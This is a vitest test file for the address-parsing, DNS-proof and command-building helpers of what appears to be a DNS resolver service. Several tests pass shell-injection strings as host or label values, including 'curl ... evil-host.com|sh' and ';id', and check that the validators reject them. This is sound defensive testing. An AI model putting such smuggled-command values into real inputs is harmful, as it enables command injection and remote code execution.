import {describe, expect, it} from "vitest";

import {canProve, emptiesRequire, inVerifyOrigin, isDnsName, isProbeHost, liveChallenge, looksLikeCidr, parseCidrs, probeUrl, proofCommands, protectionOf, hostDeleteEmptiesStack, releaseEmptiesStack, verifyHostOf} from "./ipModel.ts";

describe("an address or a subnet (T-262)", () => {
  it("accepts IPv4 and IPv6 addresses and prefixes", () => {
    for (const ok of ["203.0.113.7", "198.51.100.0/24", "2001:db8::/48", "::1", "fe80::1", "2001:db8:0:0:0:0:0:1", "::ffff:192.0.2.1"]) expect(looksLikeCidr(ok), ok).toBe(true);
  });
  it("refuses what is not one", () => {
    for (const bad of ["", "300.1.1.1", "1.2.3", "1.2.3.4/33", "2001:db8::/129", "a.b.c.d", "1.2.3.4/", "1.2.3.4/x", ":::1", "1::2::3", "hello", "1.2.3.4/24/1"]) expect(looksLikeCidr(bad), bad).toBe(false);
  });
});

describe("a list of them", () => {
  it("splits on lines, commas and spaces, reads Persian digits, drops repeats and marks the bad ones", () => {
    const parsed = parseCidrs("203.0.113.7, ۱۹۸.۵۱.۱۰۰.۰/۲۴\n203.0.113.7;nope\n2001:db8::/48");
    expect(parsed.items).toEqual(["203.0.113.7", "198.51.100.0/24", "nope", "2001:db8::/48"]);
    expect(parsed.bad).toEqual([{index: 2, text: "nope"}]);
    expect(parsed.tooMany).toBe(false);
  });
  it("counts 100 at most", () => {
    const many = Array.from({length: 101}, (_, i) => `10.0.${Math.floor(i / 250)}.${i % 250}`).join(" ");
    expect(parseCidrs(many).tooMany).toBe(true);
    expect(parseCidrs(many.split(" ").slice(0, 100).join(" ")).tooMany).toBe(false);
  });
});

describe("the protections of an authorized address (T-263)", () => {
  it("protects the current address, and the last one while Require is on and the list is complete", () => {
    expect(protectionOf({is_current: true}, false, 5, true)).toBe("current");
    expect(protectionOf({is_current: false}, true, 1, true)).toBe("last");
    expect(protectionOf({is_current: false}, true, 1, false)).toBeNull();
    expect(protectionOf({is_current: false}, false, 1, true)).toBeNull();
    expect(protectionOf({is_current: false}, true, 2, true)).toBeNull();
  });
  it("sees a selection that would empty the list under Require", () => {
    expect(emptiesRequire(true, 3, true, 3)).toBe(true);
    expect(emptiesRequire(true, 3, true, 2)).toBe(false);
    expect(emptiesRequire(false, 3, true, 3)).toBe(false);
    expect(emptiesRequire(true, 3, false, 3)).toBe(false);
  });
});

describe("proving a claim (T-267)", () => {
  it("offers proof where proof can change something", () => {
    expect(canProve({state: "pending_proof", proven: false, needs_admin: false})).toBe(true);
    expect(canProve({state: "grace", proven: false, needs_admin: false})).toBe(true);
    expect(canProve({state: "active", proven: false, needs_admin: false})).toBe(true);
    expect(canProve({state: "active", proven: true, needs_admin: false})).toBe(false);
    expect(canProve({state: "suspended", proven: false, needs_admin: false})).toBe(false);
    expect(canProve({state: "pending_proof", proven: false, needs_admin: true})).toBe(false);
  });
  it("a challenge is live until it expires", () => {
    const challenge = {id: "c", label: "x", expires_at: "2026-01-01T00:10:00Z", observed: false};
    expect(liveChallenge({challenge}, Date.parse("2026-01-01T00:09:59Z"))).toBe(challenge);
    expect(liveChallenge({challenge}, Date.parse("2026-01-01T00:10:00Z"))).toBeNull();
    expect(liveChallenge({}, 0)).toBeNull();
  });
  it("builds the name and the commands from the zone of the Resolver host", () => {
    expect(verifyHostOf("abc", "r1.dns.example.test")).toBe("abc.verify.dns.example.test");
    expect(verifyHostOf("abc", undefined)).toBeNull();
    expect(verifyHostOf("abc", "nodots")).toBeNull();
    expect(proofCommands("h.verify.z", "203.0.113.53")).toEqual({
      dig: "dig TXT h.verify.z @203.0.113.53",
      digTcp: "dig +tcp TXT h.verify.z @203.0.113.53",
      nslookup: "nslookup -vc -type=TXT h.verify.z 203.0.113.53",
    });
  });
  it("makes the browser fetch only under the verify origin", () => {
    const origin = "https://*.verify.dns.example.test";
    expect(inVerifyOrigin("abc.verify.dns.example.test", origin)).toBe(true);
    expect(inVerifyOrigin("a.b.verify.dns.example.test", origin)).toBe(false);
    expect(inVerifyOrigin("abc.verify.dns.other.test", origin)).toBe(false);
    expect(inVerifyOrigin("abc.verify.dns.example.test", null)).toBe(false);
  });

  it("refuses a label, a name or an address of an odd shape (S6-r1-9)", () => {
    for (const label of ["x#", "a;curl${IFS}evil|sh;#", "a b", "-x", "A_B", "", "a".repeat(64)]) expect(verifyHostOf(label, "r1.dns.example.test"), label).toBeNull();
    expect(proofCommands("a;id.verify.z", "203.0.113.53")).toBeNull();
    expect(proofCommands("h.verify.z", "1.1.1.1;id")).toBeNull();
    expect(proofCommands("h.verify.z", "203.0.113.0/24")).toBeNull();
    expect(proofCommands("-h.verify.z", "203.0.113.53")).toBeNull();
    expect(proofCommands("h.verify.z", "2001:db8::53")).not.toBeNull();
  });
  it("refuses shell characters and look-alikes between the labels of a name, not only in the first label (S6-r2-2, S6-r2-5)", () => {
    for (const host of ["h.verify.z;id", "h.verify.a;id;b", "abc.verify.ex;rm.org", "h.verify.a b", "h.verify.a|sh", "h.verify.a&id", "h.verify.a`id`", "h.verify.a$x", "h.verify.a\u202Eb", "a.b|c", "abc.a;curl evil-host.com|sh;b", "abc.x id", "h.verify.a\nb", "h.verify.a-"]) {
      expect(isDnsName(host), host).toBe(false);
      expect(isProbeHost(host), host).toBe(false);
      expect(proofCommands(host, "203.0.113.53"), host).toBeNull();
    }
    expect(verifyHostOf("abc", "r1.a;id;b")).toBeNull();
    expect(verifyHostOf("abc", "r1.a b.test")).toBeNull();
    expect(isProbeHost("h.verify.dns.example.test")).toBe(true);
  });
  it("builds the probe URL only when the parser keeps the host that was checked (S6-r1-9)", () => {
    const origin = "https://*.verify.dns.example.test";
    expect(probeUrl("abc.verify.dns.example.test", origin)).toBe("https://abc.verify.dns.example.test/v");
    for (const host of ["x#.verify.dns.example.test", "x@y.verify.dns.example.test", "x/.verify.dns.example.test", "x\\.verify.dns.example.test", "x?.verify.dns.example.test", "x:80.verify.dns.example.test"]) {
      expect(inVerifyOrigin(host, origin), host).toBe(false);
      expect(probeUrl(host, origin), host).toBeNull();
    }
    expect(probeUrl("abc.verify.dns.example.test", null)).toBeNull();
  });
});

describe("what a release or a host delete takes away (S6-r3-5)", () => {
  it("a claim that holds a Plain DNS identity empties its stack only while Plain DNS is on", () => {
    expect(releaseEmptiesStack(true, {state: "active"})).toBe(true);
    expect(releaseEmptiesStack(true, {state: "grace"})).toBe(true);
    expect(releaseEmptiesStack(true, {state: "pending_proof"})).toBe(false);
    expect(releaseEmptiesStack(true, {state: "suspended"})).toBe(false);
    expect(releaseEmptiesStack(false, {state: "active"})).toBe(false);
  });
  it("a host delete empties it under Require, or with Plain DNS on and a claim made from Dynamic DNS (cautious until the claims are read)", () => {
    expect(hostDeleteEmptiesStack(true, false, [])).toBe(true);
    expect(hostDeleteEmptiesStack(false, false, undefined)).toBe(false);
    expect(hostDeleteEmptiesStack(false, true, undefined)).toBe(true);
    expect(hostDeleteEmptiesStack(false, true, [{state: "active", source: "manual"}])).toBe(false);
    expect(hostDeleteEmptiesStack(false, true, [{state: "grace", source: "ddns"}])).toBe(true);
    expect(hostDeleteEmptiesStack(false, true, [{state: "suspended", source: "ddns"}])).toBe(false);
  });
});
